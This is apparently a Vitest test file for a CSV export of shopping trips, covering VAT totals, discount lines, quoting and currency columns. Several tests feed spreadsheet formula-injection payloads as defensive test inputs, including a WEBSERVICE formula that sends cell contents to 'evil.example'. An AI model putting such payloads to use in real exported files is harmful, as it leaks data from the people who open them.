import { describe, expect, it } from 'vitest';
import type { Item, Store, Trip } from '#lib/data/db.ts';
import { tripsToCsv } from './csv';

const store: Store = {
	id: 's',
	name: 'Tesco',
	branch: 'Leeds',
	taxRateBps: 2000,
	pricesIncludeTax: true,
	createdAt: 0,
	lastUsedAt: 0,
	updatedAt: 0
};

const trip: Trip = {
	id: 't',
	storeId: 's',
	status: 'finished',
	photosKept: false,
	startedAt: new Date(2026, 9, 28, 17, 2).getTime(),
	finishedAt: new Date(2026, 9, 28, 17, 46).getTime(),
	totals: { inclMinor: 0, exclMinor: 0, itemCount: 0, taxRateBps: 2000 },
	updatedAt: 0
};

let created = 0;
const item = (fields: Partial<Item>): Item => ({
	id: `i${created}`,
	tripId: 't',
	description: 'Milk',
	unitPriceMinor: 145,
	priceIncludesTax: true,
	quantity: 1,
	edited: false,
	createdAt: ++created,
	updatedAt: 0,
	...fields
});

describe('tripsToCsv', () => {
	it('adds a discount as a line of its own, so the lines add up to the total paid', () => {
		// £6.00 incl. VAT less 10%: £5.40 paid, £4.50 excl. VAT.
		const discounted: Trip = {
			...trip,
			discountKind: 'percent',
			discountValue: 1000,
			totals: { inclMinor: 540, exclMinor: 450, itemCount: 1, taxRateBps: 2000, discountMinor: 60 }
		};
		const csv = tripsToCsv([
			{ trip: discounted, store, items: [item({ description: 'Wine', unitPriceMinor: 600 })] }
		]);
		expect(csv.slice(1).split('\r\n').slice(1)).toEqual([
			'2026-10-28 17:46,Tesco · Leeds,Wine,,1,,6.00,Yes,6.00,5.00,1.00',
			'2026-10-28 17:46,Tesco · Leeds,Discount (10%),,1,,-0.60,Yes,-0.60,-0.50,-0.10',
			''
		]);
	});

	it('writes a UTF-8 BOM, a header and one CRLF-ended row per item, oldest item first', () => {
		const csv = tripsToCsv([
			{
				trip,
				store,
				items: [
					item({ description: 'Bread', unitPriceMinor: 99, createdAt: 20 }),
					item({ description: 'Milk 2L', quantity: 2, barcode: '5012345678900', createdAt: 10 })
				]
			}
		]);
		expect(csv.startsWith('﻿')).toBe(true);
		expect(csv.slice(1).split('\r\n')).toEqual([
			'Date,Store,Description,Barcode,Quantity,Currency,Unit price,Unit price includes tax,Line total incl. tax,Line total excl. tax,Tax',
			'2026-10-28 17:46,Tesco · Leeds,Milk 2L,="5012345678900",2,,1.45,Yes,2.90,2.42,0.48',
			'2026-10-28 17:46,Tesco · Leeds,Bread,,1,,0.99,Yes,0.99,0.83,0.16',
			''
		]);
	});

	it('works out incl. tax from a trade price entered excl. tax', () => {
		const csv = tripsToCsv([
			{ trip, store, items: [item({ unitPriceMinor: 1000, priceIncludesTax: false })] }
		]);
		expect(csv.split('\r\n')[1]).toBe(
			'2026-10-28 17:46,Tesco · Leeds,Milk,,1,,10.00,No,12.00,10.00,2.00'
		);
	});

	it('uses the VAT rate the trip was finished with', () => {
		const zeroRated = { ...trip, totals: { ...trip.totals!, taxRateBps: 0 } };
		const csv = tripsToCsv([{ trip: zeroRated, store, items: [item({})] }]);
		expect(csv.split('\r\n')[1]).toMatch(/,1\.45,1\.45,0\.00$/);
	});

	it('quotes commas, quotes and line breaks, and keeps £ and accents', () => {
		const csv = tripsToCsv([
			{ trip, store, items: [item({ description: 'Pâté, "smooth"\nfine £2 deal' })] }
		]);
		expect(csv).toContain('"Pâté, ""smooth""\nfine £2 deal"');
	});

	it('stops a description being run as a spreadsheet formula', () => {
		const csv = tripsToCsv([
			{
				trip,
				store,
				items: [item({ description: '=HYPERLINK("http://x")' }), item({ description: '-5% off' })]
			}
		]);
		expect(csv).toContain(`"'=HYPERLINK(""http://x"")"`);
		expect(csv).toContain(",'-5% off,");
	});

	it('only writes a barcode of digits in the ="…" text form', () => {
		// A barcode is any text a partner's phone synced, so it must not become a formula.
		const csv = tripsToCsv([
			{
				trip,
				store,
				items: [item({ barcode: '"&WEBSERVICE("https://evil.example/?"&C2)&"' })]
			}
		]);
		expect(csv.split('\r\n')[1]).toContain(
			',Milk,"""&WEBSERVICE(""https://evil.example/?""&C2)&""",1,'
		);
		expect(csv).not.toContain('="');
		const leading = tripsToCsv([{ trip, store, items: [item({ barcode: '=1+1' })] }]);
		expect(leading.split('\r\n')[1]).toContain(",Milk,'=1+1,1,");
	});

	it('escapes the currency like any other text', () => {
		const csv = tripsToCsv([
			{ trip, store: { ...store, currency: '=1+1,"x"' }, items: [item({})] }
		]);
		expect(csv.split('\r\n')[1]).toContain(`,1,"'=1+1,""x""",1.45,`);
	});

	it('says nothing of pounds or VAT for a store with no currency', () => {
		const csv = tripsToCsv([{ trip, store, items: [item({})] }]);
		expect(csv).not.toMatch(/£|GBP|VAT/);
	});

	it("writes each trip's store currency", () => {
		const csv = tripsToCsv([{ trip, store: { ...store, currency: 'EUR' }, items: [item({})] }]);
		expect(csv.split('\r\n')[1]).toContain(',Milk,,1,EUR,1.45,');
	});

	it('names a deleted store, and writes just the header with no trips', () => {
		expect(tripsToCsv([{ trip, items: [item({})] }])).toContain(',Deleted store,');
		expect(tripsToCsv([]).split('\r\n')).toHaveLength(2);
	});
});
